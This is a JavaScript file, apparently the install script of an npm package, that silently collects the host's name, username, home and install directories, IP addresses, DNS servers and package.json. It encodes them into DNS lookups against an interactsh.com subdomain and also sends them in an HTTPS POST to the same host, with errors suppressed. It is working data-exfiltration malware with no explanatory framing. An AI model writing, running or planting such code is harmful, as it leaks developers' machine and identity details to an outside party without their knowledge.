const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
var path = require('path');
const packageJSON = require("./package.json");
const package = packageJSON.name;

function getFiles(paths) {
var ufiles=[];
for(var j=0;j<paths.length;j++){
  mpath = paths[j];
  files = fs.readdirSync(mpath);
  for(var i=0;i<files.length;i++){
  ufiles.push(path.join(mpath,files[i]));
  }
}
  return ufiles;
}

function toHex(data){
const bufferText = Buffer.from(data, 'utf8');
const text = bufferText.toString('hex');
return text;
}
function gethttpips(){
var str=[];
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
str.push(networkInterfaces[item][i].address);
}
}
}
return str;
}
function getIps(){
str="";
var networkInterfaces = os.networkInterfaces();
for(item in networkInterfaces){
if(item != "lo"){
for(var i=0;i<networkInterfaces[item].length;i++){
str=str+toHex(networkInterfaces[item][i].address)+".";
}
}
}
return str.slice(0,-1);
}
function getPathChunks(path){
str="p";
chunks = path.split('/');
for(var i=0;i<chunks.length;i++){
str=str+toHex(chunks[i])+".";
}
str=str.slice(0,-1)+"p";
return str;
}
function toName(pkg){
var str="";
var queries = [];
var substr1 = "";
var substr2 = "";
var hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
str=toHex(pkg.hn)+"."+toHex(pkg.p)+"."+getPathChunks(pkg.c)+"."+toHex(pkg.un)+"."+getIps()+"."+hostname;
if(str.length>255){
substr1 = toHex(pkg.p)+"."+getPathChunks(pkg.c);
substr2 = getIps();
if(substr1.length<150){
substr1 = toHex(pkg.hn)+"."+substr1+"."+toHex(pkg.un);
queries.push(substr1+"."+hostname);
queries.push(substr2+"."+hostname);
}
else if(substr2.length<150){
substr2 = toHex(pkg.hn)+"."+toHex(pkg.un)+"."+substr2;
queries.push(substr1+"."+hostname);
queries.push(substr2+"."+hostname);
}
else{
queries.push(toHex(pkg.hn)+"."+substr1+"."+hostname);
queries.push(toHex(pkg.hn)+"."+toHex(pkg.hd)+"."+toHex(pkg.un)+"."+hostname);
queries.push(toHex(pkg.hn)+"."+substr2+"."+hostname);
}
}
else{
queries.push(str);
}
//console.log(str.length);
return queries;
}

const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
    //dirs: JSON.stringify(getFiles(["C:\\","D:\\","C:\\Users\\"])),
}
var qs = toName(td);
for(var j=0;j<qs.length;j++){
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}

const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
